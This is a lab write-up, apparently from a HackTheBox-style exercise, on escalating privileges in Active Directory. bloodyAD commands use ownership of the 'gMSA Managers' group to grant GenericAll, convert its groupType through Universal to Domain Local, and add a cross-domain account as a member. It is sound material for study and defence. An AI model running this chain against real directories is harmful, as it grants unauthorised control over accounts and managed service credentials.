---
description: From BloodHound, we identified that we own the group.
---

# Own

Using this ownership, we first granted ourselves GenericAll on the object.

This provided full control, allowing us to modify attributes such as groupType and proceed with further abuse.

<figure><img src="../../../.gitbook/assets/image (3) (1).png" alt=""><figcaption></figcaption></figure>

We grant GenericAll on target object

{% code overflow="wrap" %}
```bash
bloodyAD --host dc2.pong.htb -d pong.htb -u 'c.roberts@ping.htb' -k \
  add genericAll \
  'CN=gMSA Managers,CN=Users,DC=pong,DC=htb' \
  'S-1-5-21-750635624-2058721901-1932338391-2617'
```
{% endcode %}

<figure><img src="../../../.gitbook/assets/image (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

#### Step2: **Group Type Abuse**

#### **Group Type Abuse**

The BloodHound edge showed **ownership**, which we leveraged to gain **write access** on the group object.

Our goal was to convert the group into a **Domain Local security group** (<mark style="color:$danger;">`-2147483644`</mark>).

A direct change failed with <mark style="color:$danger;">`ERROR_NOT_SUPPORTED`</mark>, so we performed it in two steps:

1. **Global → Universal** (<mark style="color:$danger;">`2147483640`</mark>)
2. **Universal → Domain Local** (<mark style="color:$danger;">`2147483644`</mark>)

The <mark style="color:$danger;">`groupType`</mark> attribute defines scope and security:

* <mark style="color:$danger;">`0x80000000`</mark> → SECURITY\_ENABLED
* <mark style="color:$danger;">`0x00000004`</mark> → DOMAIN\_LOCAL\_GROUP
*   <mark style="color:$danger;">`0x00000008`</mark> → UNIVERSAL\_GROUP

    <figure><img src="../../../.gitbook/assets/image (2) (1) (1).png" alt=""><figcaption></figcaption></figure>

**Global → Universal (**<mark style="color:$danger;">`2147483640`</mark>)

{% code overflow="wrap" %}
```bash
bloodyAD --host dc2.pong.htb -d pong.htb -u 'c.roberts@ping.htb' -k \
  set object 'CN=gMSA Managers,CN=Users,DC=pong,DC=htb' groupType -v '-2147483640'
```
{% endcode %}

We change group type again

**Universal → Domain Local** (<mark style="color:$danger;">`2147483644`</mark>)

{% code overflow="wrap" %}
```bash
bloodyAD -k --host dc2.pong.htb -d pong.htb -u c.roberts \
set object 'CN=gMSA Managers,CN=Users,DC=pong,DC=htb' groupType -v -2147483644
```
{% endcode %}

Step3: We add ourselves to the group

{% code overflow="wrap" %}
```bash
bloodyAD -k --host dc2.pong.htb -d pong.htb -u c.roberts \add groupMember 'CN=gMSA Managers,CN=Users,DC=pong,DC=htb' \S-1-5-21-750635624-2058721901-1932338391-2617
```
{% endcode %}

<figure><img src="../../../.gitbook/assets/image (3) (1) (1).png" alt=""><figcaption></figcaption></figure>

**Why convert to Domain Local?**

**Domain Local groups** can have members from **any trusted domain**, including cross-forest/cross-domain SIDs — which is useful for privilege escalation in multi-domain environments like this lab (note: `ping.htb` vs `pong.htb` are two different domains).

**Why the two-step conversion?**

AD enforces rules about group type transitions:

{% code overflow="wrap" %}
```
Global → Universal ✅ (allowed)
Universal → Domain Local ✅ (allowed)

Global → Domain Local ❌ (ERROR_NOT_SUPPORTED — direct jump blocked)
```
{% endcode %}

So the attack path was:

```
Global Security Group
       ↓  (step 1: change to Universal)
Universal Security Group
       ↓  (step 2: change to Domain Local)
Domain Local Security Group  ✅
```

#### The Full Attack Chain

```
c.roberts owns "gMSA Managers" group
        ↓
Leverage ownership → write GenericAll to DACL
        ↓
Now have full control over the group object
        ↓
Modify groupType: Global → Universal → Domain Local
        ↓
Domain Local group can now accept cross-domain members
        ↓
Add your cross-domain account → inherit gMSA Manager privileges
```
